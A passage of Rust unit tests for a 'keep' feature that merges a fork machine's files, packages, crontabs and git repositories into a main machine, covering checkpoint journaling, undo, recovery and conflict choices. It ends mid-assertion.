    assert!(super::service::settle_request(&world.requests, &world.journal, &open).is_none());
}

#[test]
fn a_keep_that_was_undone_before_settling_closes_the_request_and_is_not_kept_again() {
    use silo_api::methods::keep::FoldRequestStatus;
    let world = settling("fr-settle-b");
    for state in [
        super::journal::State::Undoable,
        super::journal::State::Consumed,
    ] {
        world
            .journal
            .set_state("main", &world.checkpoint.id, state)
            .unwrap();
    }
    let settled =
        super::service::settle_request(&world.requests, &world.journal, &world.request).unwrap();
    assert_eq!(settled.status, FoldRequestStatus::Kept);
    assert_eq!(
        settled.keep_id.as_deref(),
        Some(world.checkpoint.id.as_str())
    );
}

#[test]
fn a_keep_that_was_rolled_back_reopens_the_request() {
    use silo_api::methods::keep::FoldRequestStatus;
    let world = settling("fr-settle-c");
    // Rolled back: the checkpoint was consumed without the keep ever succeeding.
    world
        .journal
        .set_state(
            "main",
            &world.checkpoint.id,
            super::journal::State::Consumed,
        )
        .unwrap();
    assert!(
        super::service::settle_request(&world.requests, &world.journal, &world.request).is_none()
    );
    let after = world.requests.get("fr-settle-c").unwrap().unwrap();
    assert_eq!(after.status, FoldRequestStatus::Open);
    assert_eq!(after.keeping_since_ms, None);
}

#[test]
fn the_keep_job_settles_a_finished_keep_while_it_holds_the_request() {
    use super::service::{begin_request_keep, Start};
    use silo_api::methods::keep::FoldRequestStatus;
    let world = settling("fr-settle-d");
    world
        .journal
        .set_state(
            "main",
            &world.checkpoint.id,
            super::journal::State::Undoable,
        )
        .unwrap();
    // The job holds the claim; settling through it must not need a second one.
    let _held = crate::fold_requests::claim("fr-settle-d").unwrap();
    assert!(
        super::service::settle_request(&world.requests, &world.journal, &world.request).is_none(),
        "the claiming settle leaves a held request alone"
    );
    assert_eq!(status_of(&world), FoldRequestStatus::Keeping);
    match begin_request_keep(&world.requests, &world.journal, "fr-settle-d").unwrap() {
        Start::Settled(settled) => assert_eq!(settled.status, FoldRequestStatus::Kept),
        Start::Keep => panic!("the finished keep was about to run a second time"),
    }
    // A request with no earlier keep starts a new one.
    let mut open = fold_request(FoldRequestStatus::Open);
    open.id = "fr-settle-e".into();
    world.requests.put(&open).unwrap();
    assert_eq!(
        begin_request_keep(&world.requests, &world.journal, "fr-settle-e").unwrap(),
        Start::Keep
    );
}
#[test]
fn a_finished_keep_is_found_by_its_fork_digest_and_start_time() {
    let world = World::new(Os::Linux, &["fork", "main"]);
    let env = Fake(world);
    let (_dir, journal) = journal();
    let checkpoint = env
        .checkpoint_before_keep("main", "Before keep of fork")
        .unwrap();
    journal.record_pending("main", &checkpoint).unwrap();
    journal.tag("main", &checkpoint.id, "fork", "d1").unwrap();
    // Pending: the keep has not succeeded, so it did not finish.
    assert_eq!(journal.finished_keep("main", "fork", "d1", 0), None);
    journal
        .set_state("main", &checkpoint.id, super::journal::State::Undoable)
        .unwrap();
    let found = journal.finished_keep("main", "fork", "d1", 0).unwrap();
    assert_eq!(found.id, checkpoint.id);
    assert_eq!(journal.finished_keep("main", "fork", "d2", 0), None);
    assert_eq!(journal.finished_keep("main", "other", "d1", 0), None);
    // A keep that finished before the request's keep started is not its keep.
    assert_eq!(journal.finished_keep("main", "fork", "d1", u128::MAX), None);
}

#[test]
fn an_interrupted_keep_is_recovered_by_restoring_its_checkpoint_which_is_then_not_undoable() {
    let world = World::new(Os::Linux, &["fork", "main"]);
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let checkpoint = env
        .checkpoint_before_keep("main", "Before keep of fork")
        .unwrap();
    journal.record_pending("main", &checkpoint).unwrap();
    journal
        .begin(&Entry {
            fork: "fork".into(),
            target: "main".into(),
            checkpoint_id: checkpoint.id.clone(),
            checkpoint_name: checkpoint.name,
            checkpoint_scope: "full".into(),
        })
        .unwrap();
    world.with("main", |c| {
        c.pkgs.insert("dpkg half-applied".into(), "1".into())
    });
    assert_eq!(super::recover_all(&env, &journal), Vec::<String>::new());
    world.with("main", |c| assert!(c.pkgs.is_empty()));
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(journal.latest_undoable("main"), None);

    // The next keep finds a journal too, and recovers before it starts.
    journal
        .begin(&Entry {
            fork: "fork".into(),
            target: "main".into(),
            checkpoint_id: "cp1".into(),
            checkpoint_name: "x".into(),
            checkpoint_scope: "full".into(),
        })
        .unwrap();
    let before = world.logged("restore");
    run(
        &world,
        &store("", "", ""),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    assert_eq!(world.logged("restore"), before + 1);
}

#[test]
fn undo_restores_a_successful_keeps_checkpoint_once_and_says_what_it_discards() {
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let mut st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    // The target as the keep leaves it, then as it is when the undo runs.
    st.manifests
        .insert("main".into(), mt("F\t/root/.bashrc\t12\t2\tbb\n"));
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    world.with("main", |c| {
        assert!(c.files["/root/.bashrc"].0.starts_with(b"export"))
    });
    st.manifests.insert(
        "main".into(),
        mt("F\t/root/.bashrc\t12\t2\tbb\nF\t/root/later.txt\t1\t9\tdd\n"),
    );
    let UndoOutcome::Undone {
        checkpoint,
        recovered,
        changed_since,
        ..
    } = super::undo(&env, &st, &journal, "main", WAIT).unwrap()
    else {
        panic!()
    };
    assert_eq!(checkpoint.id, "cp1");
    assert!(!recovered);
    assert!(
        changed_since.iter().any(|l| l.contains("later.txt")),
        "{changed_since:?}"
    );
    world.with("main", |c| assert_eq!(c.files["/root/.bashrc"].0, b"old"));
    assert_eq!(
        super::undo(&env, &st, &journal, "main", WAIT).unwrap(),
        UndoOutcome::NothingToUndo {
            computer: "main".into()
        }
    );
}

#[test]
fn undo_returns_a_running_main_running_from_the_checkpoints_memory() {
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    let kept = world.last_scope();
    assert_eq!(kept, "full", "a running main is captured with its memory");
    let UndoOutcome::Undone { resumed, notes, .. } =
        super::undo(&env, &st, &journal, "main", WAIT).unwrap()
    else {
        panic!()
    };
    assert_eq!(resumed, Resumed::Memory);
    assert!(notes.is_empty(), "{notes:?}");
    assert_eq!(world.order(&["restore", "start"]), ["restore", "start"]);
    assert!(!world.stopped.lock().unwrap().iter().any(|c| c == "main"));
}

#[test]
fn undo_leaves_a_main_that_was_stopped_before_the_keep_stopped() {
    let world = simple_world();
    world.stopped.lock().unwrap().push("main".into());
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    assert_eq!(world.last_scope(), "disk");
    let UndoOutcome::Undone { resumed, .. } =
        super::undo(&env, &st, &journal, "main", WAIT).unwrap()
    else {
        panic!()
    };
    assert_eq!(resumed, Resumed::Stopped);
    assert_eq!(world.logged("start"), 0);
}

#[test]
fn undo_says_so_when_main_was_put_back_but_could_not_be_started() {
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    *world.fail_start.lock().unwrap() = true;
    let outcome = super::undo(&env, &st, &journal, "main", WAIT).unwrap();
    let UndoOutcome::Undone { resumed, notes, .. } = &outcome else {
        panic!()
    };
    assert_eq!(*resumed, Resumed::Stopped);
    assert!(notes[0].contains("did not start"), "{notes:?}");
    let json = outcome.to_json();
    assert_eq!(json["main"], "stopped");
    assert_eq!(json["resumedFrom"], "stopped");
}

#[test]
fn undo_of_an_interrupted_keep_also_starts_a_main_that_was_running() {
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    journal
        .begin(&Entry {
            fork: "fork".into(),
            target: "main".into(),
            checkpoint_id: "cp1".into(),
            checkpoint_name: "x".into(),
            checkpoint_scope: "full".into(),
        })
        .unwrap();
    let UndoOutcome::Undone {
        recovered, resumed, ..
    } = super::undo(&env, &st, &journal, "main", WAIT).unwrap()
    else {
        panic!()
    };
    assert!(recovered);
    assert_eq!(resumed, Resumed::Memory);
}

#[test]
fn undo_with_nothing_changed_since_reports_nothing_lost() {
    let world = simple_world();
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
    run(&world, &st, &journal, &request(Hooks::default())).unwrap();
    let UndoOutcome::Undone { changed_since, .. } =
        super::undo(&env, &st, &journal, "main", WAIT).unwrap()
    else {
        panic!()
    };
    assert!(changed_since.is_empty(), "{changed_since:?}");
}

#[test]
fn the_journal_survives_reopening_and_keeps_states_apart() {
    let (_dir, journal) = journal();
    let a = CheckpointRef {
        id: "a".into(),
        name: "A".into(),
        created_at: "1".into(),
        scope: "full".into(),
    };
    let b = CheckpointRef {
        id: "b".into(),
        name: "B".into(),
        created_at: "2".into(),
        scope: "full".into(),
    };
    journal.record_pending("main", &a).unwrap();
    journal.record_pending("main", &b).unwrap();
    journal.set_state("main", "a", State::Undoable).unwrap();
    assert_eq!(journal.latest_undoable("main").unwrap().id, "a");
    journal.set_state("main", "b", State::Undoable).unwrap();
    journal.set_state("main", "b", State::Consumed).unwrap();
    assert_eq!(
        Journal::new(_dir.path().join("keep"))
            .latest_undoable("main")
            .unwrap()
            .id,
        "a"
    );
}

#[test]
fn two_keeps_into_the_same_main_wait_or_fail_cleanly() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let (entered_tx, entered_rx) = mpsc::channel();
    let (release_tx, release_rx) = mpsc::channel();
    *world.entered.lock().unwrap() = Some(entered_tx);
    *world.gate.lock().unwrap() = Some(release_rx);
    let hooks = Hooks {
        after: vec!["slow".into()],
        ..Hooks::default()
    };

    let first = {
        let (world, journal, hooks) = (world.clone(), journal.clone(), hooks.clone());
        let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
        std::thread::spawn(move || super::keep(&Fake(world), &st, &journal, &request(hooks), WAIT))
    };
    entered_rx.recv_timeout(Duration::from_secs(10)).unwrap();

    // The second does not get in while the first is mid-keep, and changes nothing.
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let snapshots = world.snapshots.lock().unwrap().len();
    let error = super::keep(
        &Fake(world.clone()),
        &st,
        &journal,
        &request(hooks.clone()),
        Duration::from_millis(100),
    )
    .unwrap_err();
    assert!(error.starts_with("busy:"), "{error}");
    assert_eq!(world.snapshots.lock().unwrap().len(), snapshots);

    // Given time, the second waits for the first and then runs (and finds nothing left to do).
    let second = {
        let (world, journal, hooks) = (world.clone(), journal.clone(), hooks.clone());
        let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_FORK);
        std::thread::spawn(move || super::keep(&Fake(world), &st, &journal, &request(hooks), WAIT))
    };
    std::thread::sleep(Duration::from_millis(100));
    release_tx.send(()).unwrap();
    assert!(matches!(first.join().unwrap().unwrap(), Outcome::Kept(_)));
    assert!(matches!(second.join().unwrap().unwrap(), Outcome::Kept(_)));
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(world.logged("checkpoint"), 2);
}

#[test]
fn a_keep_is_refused_when_main_changed_between_the_checkpoint_and_the_held_lane() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut st = store(BASE, FORK, BASE);
    st.main_later = Some(mt(&BASE.replace("c:old", "c:other")));
    let mut req = request(Hooks::default());
    req.data_ok = true;
    let refusal = refused(run(&world, &st, &journal, &req).unwrap());
    assert_eq!(refusal.reason, "main-changed");
    assert_eq!(world.logged("git_merge"), 0);
    assert_eq!(world.logged("restore"), 0);
    assert_eq!(journal.pending("main").unwrap(), None);
    assert_eq!(journal.latest_undoable("main"), None);
}

#[test]
fn main_churn_the_keep_does_not_touch_does_not_refuse_it() {
    let world = simple_world();
    let (_dir, journal) = journal();
    let mut st = store(BASE, FORK, BASE);
    st.main_later = Some(mt(&format!(
        "{BASE}F\t/root/Documents/notes.txt\t10\t3\tc:x\nPROC\tsshd-session\n"
    )));
    let mut req = request(Hooks::default());
    req.data_ok = true;
    assert!(matches!(
        run(&world, &st, &journal, &req).unwrap(),
        Outcome::Kept(_)
    ));
}

#[test]
fn recovery_reports_the_lane_held_before_it_restores() {
    let world = World::new(Os::Linux, &["fork", "main"]);
    let env = Fake(world.clone());
    let (_dir, journal) = journal();
    let checkpoint = env.checkpoint_before_keep("main", "Before keep").unwrap();
    journal
        .begin(&Entry {
            fork: "fork".into(),
            target: "main".into(),
            checkpoint_id: checkpoint.id.clone(),
            checkpoint_name: checkpoint.name,
            checkpoint_scope: "full".into(),
        })
        .unwrap();
    let seen = std::cell::Cell::new(None);
    super::recover_one(&env, &journal, "main", &|| {
        seen.set(Some(world.logged("restore")));
    })
    .unwrap();
    assert_eq!(seen.get(), Some(0));
    assert_eq!(world.logged("restore"), 1);
    assert_eq!(super::interrupted_targets(&journal), Vec::<String>::new());
}

fn run_script(cmd: &GuestCmd, path: &std::path::Path, dir: &std::path::Path) -> (i32, String) {
    let mut command = std::process::Command::new("bash");
    command.args(["-c", &cmd.script]).current_dir(dir).env(
        "PATH",
        format!("{}:{}", path.display(), std::env::var("PATH").unwrap()),
    );
    for (name, value) in &cmd.args {
        command.env(format!("A_{name}"), value);
    }
    let out = command.output().unwrap();
    (
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

fn stub(dir: &std::path::Path, name: &str, body: &str) {
    let path = dir.join(name);
    std::fs::write(&path, format!("#!/bin/bash\n{body}\n")).unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
}

#[test]
fn a_package_removal_that_takes_other_packages_with_it_is_refused() {
    let bin = tempfile::tempdir().unwrap();
    stub(
        bin.path(),
        "apt-get",
        "if [ \"$1\" = -s ]; then echo 'Remv libfoo [1.0]'; echo 'Remv main-tool:amd64 [2.0]'; exit 0; fi\necho real >> \"$PWD/ran\"",
    );
    let work = tempfile::tempdir().unwrap();
    let only = scripts::pkg_remove(Os::Linux, "dpkg", &["libfoo".into()]).unwrap();
    let (code, stderr) = run_script(&only, bin.path(), work.path());
    assert_eq!(code, 4, "{stderr}");
    assert!(stderr.contains("main-tool"), "{stderr}");
    assert!(!work.path().join("ran").exists());
    let both =
        scripts::pkg_remove(Os::Linux, "dpkg", &["libfoo".into(), "main-tool".into()]).unwrap();
    let (code, stderr) = run_script(&both, bin.path(), work.path());
    assert_eq!(code, 0, "{stderr}");
    assert!(work.path().join("ran").exists());
}

#[test]
fn a_brew_removal_with_installed_dependents_is_refused() {
    let bin = tempfile::tempdir().unwrap();
    stub(
        bin.path(),
        "brew",
        "if [ \"$1\" = uses ]; then echo dependent; exit 0; fi\necho real >> \"$PWD/ran\"",
    );
    let work = tempfile::tempdir().unwrap();
    let cmd = scripts::pkg_remove(Os::Macos, "brew", &["lib".into()]).unwrap();
    let (code, stderr) = run_script(&cmd, bin.path(), work.path());
    assert_eq!(code, 4, "{stderr}");
    assert!(stderr.contains("dependent"));
    assert!(!work.path().join("ran").exists());
}

#[test]
fn every_commit_is_checked_for_credentials_even_when_a_later_one_deletes_the_file() {
    let repo = tempfile::tempdir().unwrap();
    let git = |args: &[&str]| {
        let out = std::process::Command::new("git")
            .args([
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "-c",
                "commit.gpgsign=false",
            ])
            .args(args)
            .current_dir(repo.path())
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout).trim().to_owned()
    };
    git(&["init", "-q"]);
    std::fs::write(repo.path().join("a.txt"), "a").unwrap();
    git(&["add", "."]);
    git(&["commit", "-q", "-m", "one"]);
    let old = git(&["rev-parse", "HEAD"]);
    std::fs::write(repo.path().join(".env"), "SECRET=1").unwrap();
    git(&["add", "."]);
    git(&["commit", "-q", "-m", "two"]);
    git(&["rm", "-q", ".env"]);
    git(&["commit", "-q", "-m", "three"]);
    let new = git(&["rev-parse", "HEAD"]);
    let repo_path = repo.path().to_string_lossy().into_owned();
    let list = |old: &str| {
        let cmd = scripts::git_changed(&repo_path, old, &new);
        let mut command = std::process::Command::new("bash");
        command.args(["-c", &cmd.script]);
        for (name, value) in &cmd.args {
            command.env(format!("A_{name}"), value);
        }
        let out = command.output().unwrap();
        assert!(out.status.success());
        String::from_utf8_lossy(&out.stdout)
            .split('\0')
            .filter(|s| !s.is_empty())
            .map(str::to_owned)
            .collect::<Vec<_>>()
    };
    assert!(list(&old).contains(&".env".to_owned()));
    assert!(list("").contains(&".env".to_owned()));
    assert!(list("").contains(&"a.txt".to_owned()));
}

#[test]
fn file_write_creates_missing_parents_and_applies_the_mode() {
    use std::{io::Write, os::unix::fs::PermissionsExt, process::Stdio};
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join(".claude/nested/settings.json");
    let os = if cfg!(target_os = "macos") {
        Os::Macos
    } else {
        Os::Linux
    };
    let cmd = scripts::file_write(os, path.to_str().unwrap(), "600", b"{}");
    // The script chowns new directories and the file to the owner of the nearest existing
    // parent, found before anything is created.
    assert!(cmd.script.contains("ao=$("), "{}", cmd.script);
    assert!(cmd.script.contains("chown -h \"$ao\" \"$x\""));
    assert!(cmd.script.contains("[ ! -L \"$x\" ]"));
    assert!(cmd.script.contains("mktemp \"$d/.silo-keep."));
    // Ownership is set before the mode so setuid and setgid bits survive.
    assert!(cmd.script.find("chown -h \"$o\"") < cmd.script.find("chmod \"$A_mode\""));
    assert!(cmd.script.contains("else o=\"$ao\"; fi"));
    let mut child = std::process::Command::new("bash")
        .arg("-c")
        .arg(&cmd.script)
        .env("A_path", path.to_str().unwrap())
        .env("A_mode", "600")
        .stdin(Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(b"{}").unwrap();
    assert!(child.wait().unwrap().success());
    assert_eq!(std::fs::read(&path).unwrap(), b"{}");
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);
}

// ------------------------------------------------------------------ choices

fn choosing(answers: &[(&str, Answer)]) -> Request {
    Request {
        choices: super::Choices {
            answers: answers
                .iter()
                .map(|(id, answer)| ((*id).to_owned(), *answer))
                .collect(),
            ..Default::default()
        },
        ..request(Hooks::default())
    }
}

fn skipping(ids: &[&str]) -> Request {
    Request {
        choices: super::Choices {
            skip: ids.iter().map(|id| (*id).to_owned()).collect(),
            ..Default::default()
        },
        ..request(Hooks::default())
    }
}

fn kept(outcome: Outcome) -> super::Report {
    match outcome {
        Outcome::Kept(report) => report,
        other => panic!("expected a kept result, got {other:?}"),
    }
}

fn item<'a>(report: &'a super::Report, id: &str) -> &'a super::ReportItem {
    report
        .items
        .iter()
        .find(|i| i.id == id)
        .unwrap_or_else(|| panic!("no item {id} in {:?}", report.items))
}

const BASHRC: &str = "file:/root/.bashrc";
const APP: &str = "repo:/root/app";
const REPO_BASE: &str = "F\t/root/.bashrc\t10\t1\tc:old\nGIT\t/root/app\taaa\tmain\t0\t0\n";
const REPO_FORK: &str = "F\t/root/.bashrc\t12\t2\tbb\nGIT\t/root/app\tbbb\tmain\t0\t0\n";

/// A world where main edited .bashrc and both sides changed /root/app.
fn clashing_world() -> Arc<World> {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    *world.git_state.lock().unwrap() =
        "conflict\nCONFLICT (content): Merge conflict in a.js\n".into();
    *world.changed_files.lock().unwrap() = vec!["a.js".into()];
    world
}

#[test]
fn a_file_both_sides_changed_is_a_question_with_its_id_and_the_allowed_answers() {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    let (_dir, journal) = journal();
    let outcome = run(
        &world,
        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
        &journal,
        &request(Hooks::default()),
    )
    .unwrap();
    let Outcome::Refused { report, refusal } = outcome else {
        panic!("{outcome:?}")
    };
    assert_eq!(refusal.reason, "choices-needed");
    let conflict = &refusal.conflicts[0];
    assert_eq!(conflict.id, BASHRC);
    assert_eq!(conflict.allowed, [Answer::Fork, Answer::Main]);
    assert_eq!(
        (conflict.fork_change.as_str(), conflict.main_change.as_str()),
        ("changed", "changed")
    );
    assert!(
        refusal.message.contains("needs an answer"),
        "{}",
        refusal.message
    );
    assert!(report.items.is_empty());
    assert_eq!(world.logged("checkpoint"), 0);
    // The question serializes with the fields the wire type reads.
    let json = Outcome::Refused { report, refusal }.to_json();
    let wire: silo_api::methods::keep::ChangesKeepResult = serde_json::from_value(json).unwrap();
    let wire = wire.refusal.unwrap().conflicts.remove(0);
    assert_eq!(wire.id, BASHRC);
    assert_eq!(
        wire.allowed,
        [
            silo_api::methods::keep::KeepAnswer::Fork,
            silo_api::methods::keep::KeepAnswer::Main
        ]
    );
}

#[test]
fn a_file_conflict_is_settled_by_the_fork_or_by_main() {
    let st = || store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    let (_dir, journal) = journal();
    let report = kept(
        run(
            &world,
            &st(),
            &journal,
            &choosing(&[(BASHRC, Answer::Fork)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"export X=1\n")
    });
    assert_eq!(item(&report, BASHRC).outcome, "brought-over");

    let world = simple_world();
    world.put("main", "/root/.bashrc", "main edited");
    let (_dir, journal) = self::journal();
    let report = kept(
        run(
            &world,
            &st(),
            &journal,
            &choosing(&[(BASHRC, Answer::Main)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.files["/root/.bashrc"].0, b"main edited")
    });
    assert_eq!(world.logged("file_write"), 0);
    assert_eq!(item(&report, BASHRC).outcome, "left-as-main");
}

#[test]
fn a_package_conflict_is_settled_by_the_fork_or_by_main() {
    let base = "PKG\tdpkg\tjq\t1.6\nPKGM\tdpkg\tjq\n";
    let fork = "PKG\tdpkg\tjq\t1.7\nPKGM\tdpkg\tjq\n";
    let main = "PKG\tdpkg\tjq\t1.5\nPKGM\tdpkg\tjq\n";
    let id = "package:dpkg:jq";
    let world = World::new(Os::Linux, &["fork", "main"]);
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(base, fork, main),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.conflicts[0].id, id);
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Fork, Answer::Main]);
    assert_eq!(refusal.conflicts[0].fork_change, "now 1.7");
    assert_eq!(refusal.conflicts[0].main_change, "now 1.5");

    let report = kept(
        run(
            &world,
            &store(base, fork, main),
            &journal,
            &choosing(&[(id, Answer::Fork)]),
        )
        .unwrap(),
    );
    world.with("main", |c| {
        assert_eq!(c.pkgs.get("dpkg jq").map(String::as_str), Some("1.7"))
    });
    assert_eq!(item(&report, id).outcome, "brought-over");

    let world = World::new(Os::Linux, &["fork", "main"]);
    let (_dir, journal) = self::journal();
    let report = kept(
        run(
            &world,
            &store(base, fork, main),
            &journal,
            &choosing(&[(id, Answer::Main)]),
        )
        .unwrap(),
    );
    assert_eq!(world.logged("pkg_install"), 0);
    assert_eq!(item(&report, id).outcome, "left-as-main");
}

#[test]
fn a_package_removal_both_sides_touched_is_settled_the_same_way() {
    let base = "PKG\tdpkg\told\t1\nPKGM\tdpkg\told\n";
    let main = "PKG\tdpkg\told\t2\nPKGM\tdpkg\told\n";
    let id = "package:dpkg:old";
    let world = World::new(Os::Linux, &["fork", "main"]);
    world.with("main", |c| c.pkgs.insert("dpkg old".into(), "2".into()));
    let (_dir, journal) = journal();
    let refusal = refused(
        run(
            &world,
            &store(base, "", main),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Fork, Answer::Main]);
    assert_eq!(refusal.conflicts[0].fork_change, "removed");
    kept(
        run(
            &world,
            &store(base, "", main),
            &journal,
            &choosing(&[(id, Answer::Fork)]),
        )
        .unwrap(),
    );
    assert_eq!(world.logged("pkg_remove"), 1);
    world.with("main", |c| assert!(!c.pkgs.contains_key("dpkg old")));
}

#[test]
fn a_crontab_conflict_is_settled_by_the_fork_or_by_main() {
    let base = format!("{CRON_BASE}CRONT\troot\t0 1 * * * b\\n\n");
    let id = "cron:root";
    let make = || {
        let world = World::new(Os::Linux, &["fork", "main"]);
        world.with("fork", |c| {
            c.crontab.insert("root".into(), "5 1 * * * b\n".into())
        });
        world.with("main", |c| {
            c.crontab.insert("root".into(), "9 9 * * * b\n".into())
        });
        world
    };
    let (_dir, journal) = journal();
    let world = make();
    let refusal = refused(
        run(
            &world,
            &store(&base, CRON_FORK, CRON_MAIN),
            &journal,
            &request(Hooks::default()),
        )
        .unwrap(),
    );
    assert_eq!(refusal.conflicts[0].id, id);
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Fork, Answer::Main]);

    kept(
        run(
            &world,
            &store(&base, CRON_FORK, CRON_MAIN),
            &journal,
            &choosing(&[(id, Answer::Fork)]),
        )
        .unwrap(),
    );
    world.with("main", |c| assert_eq!(c.crontab["root"], "5 1 * * * b\n"));

    let world = make();
    let report = kept(
        run(
            &world,
            &store(&base, CRON_FORK, CRON_MAIN),
            &journal,
            &choosing(&[(id, Answer::Main)]),
        )
        .unwrap(),
    );
    world.with("main", |c| assert_eq!(c.crontab["root"], "9 9 * * * b\n"));
    assert_eq!(world.logged("crontab_write"), 0);
    assert_eq!(item(&report, id).outcome, "left-as-main");
}

#[test]
fn an_unreadable_file_and_a_blocked_destination_can_only_be_left_as_main() {
    let world = simple_world();
    world.put("main", "/root/.bashrc", "<unreadable>");
    let (_dir, journal) = journal();
    let st = store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE);
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Main]);
    // `fork` does not settle it.
    let refusal =
        refused(run(&world, &st, &journal, &choosing(&[(BASHRC, Answer::Fork)])).unwrap());
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Main]);
    kept(run(&world, &st, &journal, &choosing(&[(BASHRC, Answer::Main)])).unwrap());

    let world = simple_world();
    world.bad_dest.lock().unwrap().push("/root/.bashrc".into());
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    assert_eq!(refusal.conflicts[0].kind, "destination");
    assert_eq!(refusal.conflicts[0].id, BASHRC);
    assert_eq!(refusal.conflicts[0].allowed, [Answer::Main]);
    kept(run(&world, &st, &journal, &choosing(&[(BASHRC, Answer::Main)])).unwrap());
    assert_eq!(world.logged("file_write"), 0);
}

#[test]
fn a_repository_both_sides_changed_offers_branch_or_main_never_fork() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let st = store(REPO_BASE, REPO_FORK, REPO_BASE);
    let refusal =
        refused(run(&world, &st, &journal, &choosing(&[(BASHRC, Answer::Fork)])).unwrap());
    assert_eq!(refusal.reason, "choices-needed");
    assert_eq!(refusal.conflicts.len(), 1);
    let conflict = &refusal.conflicts[0];
    assert_eq!((conflict.kind.as_str(), conflict.id.as_str()), ("git", APP));
    assert_eq!(conflict.allowed, [Answer::Branch, Answer::Main]);
    assert!(conflict.detail.contains("a.js"));
    assert_eq!(conflict.fork_change, "new commits, now at bbb");

    // Forcing the fork over main's repository is an error naming the repository.
    let error = run(&world, &st, &journal, &choosing(&[(APP, Answer::Fork)])).unwrap_err();
    assert!(error.contains(APP) && error.contains("branch"), "{error}");
    assert_eq!(world.logged("checkpoint"), 0);
    assert_eq!(world.logged("git_merge"), 0);

    // An unsupported git offers the same two answers.
    *world.git_state.lock().unwrap() = "unsupported".into();
    let refusal = refused(run(&world, &st, &journal, &request(Hooks::default())).unwrap());
    let git = refusal.conflicts.iter().find(|c| c.kind == "git").unwrap();
    assert_eq!(git.allowed, [Answer::Branch, Answer::Main]);
}

#[test]
fn main_for_a_conflicting_repository_leaves_it_alone_without_fetching_anything() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let st = store(REPO_BASE, REPO_FORK, REPO_BASE);
    let report = kept(
        run(
            &world,
            &st,
            &journal,
            &choosing(&[(APP, Answer::Main), (BASHRC, Answer::Main)]),
        )
        .unwrap(),
    );
    assert_eq!(item(&report, APP).outcome, "left-as-main");
    assert_eq!(world.logged("git_precheck"), 0);
    assert_eq!(world.logged("git_merge"), 0);
    assert_eq!(world.logged("git_branch"), 0);
}

#[test]
fn a_repository_conflict_answered_branch_leaves_the_commits_on_a_branch_and_merges_nothing() {
    let world = clashing_world();
    let (_dir, journal) = journal();
    let st = store(REPO_BASE, REPO_FORK, REPO_BASE);
    let report = kept(
        run(
            &world,
            &st,
            &journal,
            &choosing(&[(APP, Answer::Branch), (BASHRC, Answer::Main)]),
        )
        .unwrap(),
    );
    assert_eq!(world.logged("git_merge"), 0);
    assert_eq!(world.logged("git_branch"), 1);
    world.with("main", |c| {
        assert_eq!(c.branches, ["silo/fork"]);
        assert!(c.merged.is_empty());
        // The working tree and every file are as main had them; the bundle is gone.
        assert_eq!(c.files["/root/.bashrc"].0, b"main edited");
        assert!(c.files.keys().all(|p| !p.contains("silo-keep")));
    });
    let repo = item(&report, APP);
    assert_eq!(repo.outcome, "branch");
    assert!(repo.detail.contains("silo/fork"), "{}", repo.detail);
    assert!(report
        .steps
